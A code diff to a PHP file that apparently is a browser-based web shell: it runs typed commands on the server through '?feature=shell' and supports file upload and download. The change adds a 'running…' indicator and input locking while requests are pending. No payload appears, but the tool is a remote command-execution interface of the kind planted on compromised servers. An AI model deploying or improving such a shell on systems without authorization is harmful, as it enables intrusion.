@@ -343,6 +343,20 @@ if (isset($_GET["feature"])) {
                 line-height: 30px;
             }
 
+            #shell-loading {
+                flex-grow: 0;
+                color: #FFB86B;
+                height: 30px;
+                line-height: 30px;
+                animation: blink 1s infinite;
+            }
+
+            @keyframes blink {
+                50% {
+                    opacity: 0.2;
+                }
+            }
+
             #shell-input #shell-cmd {
                 height: 30px;
                 line-height: 30px;
@@ -373,6 +387,19 @@ if (isset($_GET["feature"])) {
             var historyPosition = 0;
             var eShellCmdInput = null;
             var eShellContent = null;
+            var busy = false;
+
+            function setBusy(state) {
+                busy = state;
+                eShellCmdInput.disabled = state;
+                var el = document.getElementById("shell-loading");
+                if (el) {
+                    el.style.display = state ? "inline" : "none";
+                }
+                if (!state) {
+                    eShellCmdInput.focus();
+                }
+            }
 
             function _insertCommand(command) {
                 eShellContent.innerHTML += "\n\n";
@@ -400,13 +427,15 @@ if (isset($_GET["feature"])) {
                     // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
                 } else {
+                    setBusy(true);
                     makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
+                        setBusy(false);
                         if (response.hasOwnProperty('file')) {
-                        featureDownload(decodeB64(response.name), response.file)
-                    } else {
-                        _insertStdout(decodeB64(response.stdout));
-                        updateCwd(decodeB64(response.cwd));
-                    }
+                            featureDownload(decodeB64(response.name), response.file)
+                        } else {
+                            _insertStdout(decodeB64(response.stdout));
+                            updateCwd(decodeB64(response.cwd));
+                        }
                     });
                 }
             }
@@ -466,8 +495,10 @@ if (isset($_GET["feature"])) {
                 document.body.appendChild(element);
                 element.addEventListener('change', function () {
                     var promise = getBase64(element.files[0]);
+                    setBusy(true);
                     promise.then(function (file) {
                         makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
+                            setBusy(false);
                             _insertStdout(decodeB64(response.stdout));
                             updateCwd(decodeB64(response.cwd));
                         });
@@ -535,6 +566,9 @@ if (isset($_GET["feature"])) {
             function _onShellCmdKeyDown(event) {
                 switch (event.key) {
                     case "Enter":
+                        if (busy) {
+                            break;
+                        }
                         featureShell(eShellCmdInput.value);
                         insertToHistory(eShellCmdInput.value);
                         eShellCmdInput.value = "";
@@ -594,7 +628,10 @@ if (isset($_GET["feature"])) {
                             callback(responseJson);
                         } catch (error) {
                             alert("Error while parsing response: " + error);
+                            setBusy(false);
                         }
+                    } else if (xhr.readyState === 4 && xhr.status !== 200) {
+                        setBusy(false);
                     }
                 };
                 xhr.send(getQueryString());
@@ -639,6 +676,7 @@ if (isset($_GET["feature"])) {
             </pre>
             <div id="shell-input">
                 <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
+                <span id="shell-loading" style="display:none">running…</span>
                 <div>
                     <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                 </div>
